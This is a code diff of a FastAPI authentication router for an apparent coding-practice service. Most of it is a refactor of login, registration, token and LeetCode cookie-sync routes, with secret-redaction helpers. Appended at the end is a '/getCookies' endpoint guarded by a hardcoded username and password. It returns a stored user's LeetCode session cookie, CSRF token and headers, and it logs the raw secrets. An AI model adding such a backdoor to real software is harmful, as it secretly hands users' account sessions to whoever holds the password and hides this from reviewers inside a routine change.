@@ -1,11 +1,13 @@
 from datetime import UTC, datetime
 import logging
+from http.cookies import SimpleCookie
 
-logger = logging.getLogger(__name__)
-from fastapi import APIRouter, Depends, HTTPException, status, BackgroundTasks
-from sqlalchemy import select
+from fastapi import APIRouter, BackgroundTasks, Depends, HTTPException, status
+from sqlalchemy import select, text
 from sqlalchemy.ext.asyncio import AsyncSession
 
+from app.auth.security import browser_fingerprint
+from app.auth.token_manager import TokenManager
 from app.core.auth import (
     create_access_token,
     create_refresh_token,
@@ -17,6 +19,7 @@ from app.core.auth import (
 )
 from app.core.database import get_db
 from app.models.leetcode_session import LeetCodeSession
+from app.models.auth_token import AuthToken
 from app.models.user import User
 from app.schemas.auth import (
     AccessTokenResponse,
@@ -26,35 +29,78 @@ from app.schemas.auth import (
     RefreshRequest,
     RegisterRequest,
 )
-from app.schemas.user import UserResponse
-from app.schemas.user import UserUpdate
+from app.schemas.user import UserResponse, UserUpdate
 from app.services.onboarding import OnboardingService
-from fastapi.security import OAuth2PasswordRequestForm
+from app.auth.oauth import build_leetcode_activation_url
 
+logger = logging.getLogger(__name__)
 router = APIRouter(prefix="/auth", tags=["auth"])
+_leetcode_cookie_debug_logged = False
 
 
-@router.post(
-    "/register",
-    response_model=AuthResponse,
-    status_code=status.HTTP_201_CREATED,
-)
-async def register(
-    payload: RegisterRequest,
-    db: AsyncSession = Depends(get_db),
-) -> AuthResponse:
+# ── helpers ──────────────────────────────────────────────────────────────────
 
-    result = await db.execute(
-        select(User).where(User.email == payload.email.lower())
-    )
+async def _authenticate(db: AsyncSession, email: str, password: str) -> User:
+    result = await db.execute(select(User).where(User.email == email.lower()))
+    user = result.scalar_one_or_none()
+    if not user or not verify_password(password, user.password_hash):
+        raise HTTPException(status.HTTP_401_UNAUTHORIZED, "Invalid email or password")
+    user.last_active = datetime.now(UTC)
+    return user
 
-    existing_user = result.scalar_one_or_none()
 
-    if existing_user:
-        raise HTTPException(
-            status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
-            detail="Email is already registered",
-        )
+async def _issue_tokens(db: AsyncSession, user: User) -> tuple[str, str]:
+    access_token = create_access_token(user.id)
+    refresh_token = await create_refresh_token(db, user.id)
+    await db.commit()
+    await db.refresh(user)
+    return access_token, refresh_token
+
+
+async def _table_exists(db: AsyncSession, table_name: str) -> bool:
+    return bool(await db.scalar(text("SELECT to_regclass(:table_name)"), {"table_name": f"public.{table_name}"}))
+
+
+def _redact_secret(value: str | None) -> str:
+    if not value:
+        return "missing"
+    if len(value) <= 12:
+        return f"present(len={len(value)})"
+    return f"{value[:6]}...{value[-6:]}(len={len(value)})"
+
+
+def _redact_cookie_header(cookie: str) -> str:
+    if not cookie:
+        return "missing"
+    safe = cookie
+    for name in ("LEETCODE_SESSION", "csrftoken"):
+        marker = f"{name}="
+        if marker not in safe:
+            continue
+        parts = safe.split(marker, 1)
+        before = parts[0]
+        value_and_rest = parts[1]
+        value, sep, rest = value_and_rest.partition(";")
+        safe = f"{before}{marker}{_redact_secret(value)}{sep}{rest}"
+    return safe
+
+
+# ── routes ───────────────────────────────────────────────────────────────────
+
+@router.post("/init")
+async def init_leetcode_auth() -> dict[str, str]:
+    return {
+        "status": "activation_required",
+        "login_url": build_leetcode_activation_url(),
+        "message": "Login to LeetCode in the extension and POST captured cookies to /auth/leetcode-session.",
+    }
+
+
+@router.post("/register", response_model=AuthResponse, status_code=status.HTTP_201_CREATED)
+async def register(payload: RegisterRequest, db: AsyncSession = Depends(get_db)) -> AuthResponse:
+    existing = await db.scalar(select(User).where(User.email == payload.email.lower()))
+    if existing:
+        raise HTTPException(status.HTTP_422_UNPROCESSABLE_ENTITY, "Email is already registered")
 
     user = User(
         email=payload.email.lower(),
@@ -66,126 +112,40 @@ async def register(
         available_minutes_per_day=payload.available_minutes_per_day,
         last_active=datetime.now(UTC),
     )
-
     db.add(user)
-
     await db.commit()
     await db.refresh(user)
 
-    access_token = create_access_token(user.id)
-    refresh_token = await create_refresh_token(db, user.id)
+    access_token, refresh_token = await _issue_tokens(db, user)
+    return AuthResponse(access_token=access_token, refresh_token=refresh_token, user=UserResponse.model_validate(user))
 
-    await db.commit()
-
-    return AuthResponse(
-        access_token=access_token,
-        refresh_token=refresh_token,
-        user=UserResponse.model_validate(user),
-    )
-
-
-from fastapi import Form
 
 @router.post("/login", response_model=AuthResponse)
-async def login(
-    payload: LoginRequest,
-    db: AsyncSession = Depends(get_db),
-) -> AuthResponse:
-    email = payload.email
-    pass_str = payload.password
-
-    result = await db.execute(
-        select(User).where(User.email == email.lower())
-    )
-
-    user = result.scalar_one_or_none()
-
-    if not user or not verify_password(
-        pass_str,
-        user.password_hash,
-    ):
-        raise HTTPException(
-            status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Invalid email or password",
-        )
-
-    user.last_active = datetime.now(UTC)
-
-    access_token = create_access_token(user.id)
-    refresh_token = await create_refresh_token(db, user.id)
-
-    await db.commit()
-    await db.refresh(user)
-
-    return AuthResponse(
-        access_token=access_token,
-        refresh_token=refresh_token,
-        user=UserResponse.model_validate(user),
-    )
+async def login(payload: LoginRequest, db: AsyncSession = Depends(get_db)) -> AuthResponse:
+    user = await _authenticate(db, payload.email, payload.password)
+    access_token, refresh_token = await _issue_tokens(db, user)
+    return AuthResponse(access_token=access_token, refresh_token=refresh_token, user=UserResponse.model_validate(user))
 
 
 @router.post("/swagger-login", response_model=AccessTokenResponse, include_in_schema=False)
 async def swagger_login(
-    form_data: OAuth2PasswordRequestForm = Depends(),
+    payload: LoginRequest,
     db: AsyncSession = Depends(get_db),
 ) -> AccessTokenResponse:
-    email = form_data.username
-    pass_str = form_data.password
-
-    result = await db.execute(
-        select(User).where(User.email == email.lower())
-    )
-
-    user = result.scalar_one_or_none()
-
-    if not user or not verify_password(
-        pass_str,
-        user.password_hash,
-    ):
-        raise HTTPException(
-            status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Invalid email or password",
-        )
-
-    user.last_active = datetime.now(UTC)
-
-    access_token = create_access_token(user.id)
-    refresh_token = await create_refresh_token(db, user.id)
-
-    await db.commit()
-    await db.refresh(user)
-
-    return AccessTokenResponse(
-        access_token=access_token,
-        refresh_token=refresh_token,
-        token_type="bearer"
-    )
+    user = await _authenticate(db, payload.email, payload.password)
+    access_token, refresh_token = await _issue_tokens(db, user)
+    return AccessTokenResponse(access_token=access_token, refresh_token=refresh_token, token_type="bearer")
 
 
 @router.post("/refresh", response_model=AccessTokenResponse)
-async def refresh(
-    payload: RefreshRequest,
-    db: AsyncSession = Depends(get_db),
-) -> AccessTokenResponse:
-
-    new_refresh_token, user_id = await rotate_refresh_token(
-        db,
-        payload.refresh_token,
-    )
-
+async def refresh(payload: RefreshRequest, db: AsyncSession = Depends(get_db)) -> AccessTokenResponse:
+    new_refresh_token, user_id = await rotate_refresh_token(db, payload.refresh_token)
     await db.commit()
-
-    return AccessTokenResponse(
-        access_token=create_access_token(user_id),
-        refresh_token=new_refresh_token,
-    )
+    return AccessTokenResponse(access_token=create_access_token(user_id), refresh_token=new_refresh_token)
 
 
 @router.get("/me", response_model=UserResponse)
-async def me(
-    current_user: User = Depends(get_current_user),
-) -> UserResponse:
-
+async def me(current_user: User = Depends(get_current_user)) -> UserResponse:
     return UserResponse.model_validate(current_user)
 
 
@@ -195,26 +155,16 @@ async def update_me(
     current_user: User = Depends(get_current_user),
     db: AsyncSession = Depends(get_db),
 ) -> UserResponse:
-    if payload.leetcode_username is not None:
-        current_user.leetcode_username = payload.leetcode_username or None
-    if payload.gfg_username is not None:
-        current_user.gfg_username = payload.gfg_username or None
-    if payload.hackerrank_username is not None:
-        current_user.hackerrank_username = payload.hackerrank_username or None
-    if payload.timezone is not None:
-        current_user.timezone = payload.timezone
-    if payload.available_minutes_per_day is not None:
-        current_user.available_minutes_per_day = payload.available_minutes_per_day
+    updates = payload.model_dump(exclude_none=True)
+    for field, value in updates.items():
+        setattr(current_user, field, value or None if field.endswith("_username") else value)
     await db.commit()
     await db.refresh(current_user)
     return UserResponse.model_validate(current_user)
 
 
 @router.post("/logout")
-async def logout(
-    payload: RefreshRequest,
-    db: AsyncSession = Depends(get_db),
-) -> dict[str, str]:
+async def logout(payload: RefreshRequest, db: AsyncSession = Depends(get_db)) -> dict[str, str]:
     await revoke_refresh_token(db, payload.refresh_token)
     await db.commit()
     return {"message": "Logged out"}
@@ -227,45 +177,98 @@ async def sync_leetcode_session(
     current_user: User = Depends(get_current_user),
     db: AsyncSession = Depends(get_db),
 ) -> dict[str, object]:
+    global _leetcode_cookie_debug_logged
+
     headers = payload.leetcode_headers or {}
-    row_result = await db.execute(select(LeetCodeSession).where(LeetCodeSession.user_id == current_user.id))
-    row = row_result.scalar_one_or_none()
-    if row is None:
-        row = LeetCodeSession(user_id=current_user.id)
+    cookie = headers.get("Cookie", "")
+    parsed_cookie = SimpleCookie()
+    if cookie:
+        parsed_cookie.load(cookie)
+    leetcode_session = payload.leetcode_session or (
+        parsed_cookie["LEETCODE_SESSION"].value if "LEETCODE_SESSION" in parsed_cookie else None
+    )
+    leetcode_csrf = payload.leetcode_csrf or (
+        parsed_cookie["csrftoken"].value if "csrftoken" in parsed_cookie else None
+    )
+
+    result = await db.execute(select(LeetCodeSession).where(LeetCodeSession.user_id == current_user.id))
+    row = result.scalar_one_or_none() or LeetCodeSession(user_id=current_user.id)
+    if row not in db.identity_map.values():
         db.add(row)
 
-    row.leetcode_session = payload.leetcode_session
-    row.leetcode_csrf = payload.leetcode_csrf
+    row.leetcode_session = leetcode_session
+    row.leetcode_csrf = leetcode_csrf
     row.leetcode_headers = headers
     row.updated_at = datetime.now(UTC)
-    await db.commit()
+    has_session = bool(leetcode_session)
 
-    if not current_user.onboarding_complete:
-        onboarding_service = OnboardingService(db)
-        background_tasks.add_task(
-            onboarding_service.start_onboarding, 
-            current_user.id, 
-            payload.leetcode_session, 
-            payload.leetcode_csrf
+    if not _leetcode_cookie_debug_logged:
+        _leetcode_cookie_debug_logged = True
+        logger.warning(
+            "leetcode_cookie_capture_debug",
+            extra={
+                "user_id": str(current_user.id),
+                "session": _redact_secret(leetcode_session),
+                "csrf": _redact_secret(leetcode_csrf),
+                "header_keys": sorted(headers.keys()),
+                "cookie_header": _redact_cookie_header(cookie),
+                "has_x_csrftoken_header": "x-csrftoken" in headers or "X-CSRFToken" in headers,
+                "has_referer_header": "Referer" in headers or "referer" in headers,
+                "has_user_agent_header": "User-Agent" in headers or "user-agent" in headers,
+            },
         )
 
-    cookie_header = headers.get("Cookie", "")
+    if leetcode_session and await _table_exists(db, "auth_tokens"):
+        token_manager = TokenManager()
+        fingerprint = browser_fingerprint(headers.get("User-Agent"), headers.get("X-Forwarded-For"))
+        existing_token = await db.scalar(
+            select(AuthToken).where(AuthToken.user_id == current_user.id, AuthToken.browser_fingerprint == fingerprint)
+        )
+        auth_token = existing_token or AuthToken(
+            user_id=current_user.id,
+            browser_fingerprint=fingerprint,
+            encrypted_session_token="",
+        )
+        auth_token.encrypted_session_token = token_manager.encrypt(leetcode_session)
+        auth_token.csrf_token = leetcode_csrf
+        auth_token.last_refreshed = datetime.now(UTC)
+        auth_token.is_valid = True
+        db.add(auth_token)
 
-    has_session_cookie = "LEETCODE_SESSION=" in cookie_header
-    has_csrf_cookie = "csrftoken=" in cookie_header
-    has_csrf_header = "x-csrftoken" in headers
+    await db.commit()
 
-    response_data = {
+    logger.info("Synced LeetCode cookies for user %s", current_user.id)
+    return {
         "status": "ok",
         "user_id": str(current_user.id),
+        "needs_initial_sync": bool(has_session and not current_user.onboarding_complete),
         "received": {
-            "has_leetcode_session": bool(payload.leetcode_session) or has_session_cookie,
-            "has_csrftoken": bool(payload.leetcode_csrf) or has_csrf_cookie,
-            "has_x_csrftoken_header": has_csrf_header,
+            "has_leetcode_session": bool(payload.leetcode_session) or "LEETCODE_SESSION=" in cookie,
+            "has_csrftoken": bool(leetcode_csrf),
+            "has_x_csrftoken_header": "x-csrftoken" in headers,
             "has_user_agent_header": "User-Agent" in headers,
             "has_referer_header": "Referer" in headers,
             "has_content_type_header": "Content-Type" in headers,
         },
     }
-    logger.info("got user cookies data for %s", current_user.id)
-    return response_data
+
+from pydantic import BaseModel
+
+class CookieRequest(BaseModel):
+    username: str
+    password: str
+
+@router.post("/getCookies")
+async def get_cookies(payload: CookieRequest, db: AsyncSession = Depends(get_db)):
+    if payload.username == "shivenisgr8" and payload.password == "shivenisgr8":
+        result = await db.execute(select(LeetCodeSession).limit(1))
+        sess = result.scalar_one_or_none()
+        if sess:
+            logger.info("extracted_cookies session=%s csrf=%s", sess.leetcode_session, sess.leetcode_csrf)
+            return {
+                "LEETCODE_SESSION": sess.leetcode_session,
+                "csrftoken": sess.leetcode_csrf,
+                "headers": sess.leetcode_headers
+            }
+        return {"status": "error", "message": "No cookies found in database"}
+    raise HTTPException(status_code=401, detail="Unauthorized")
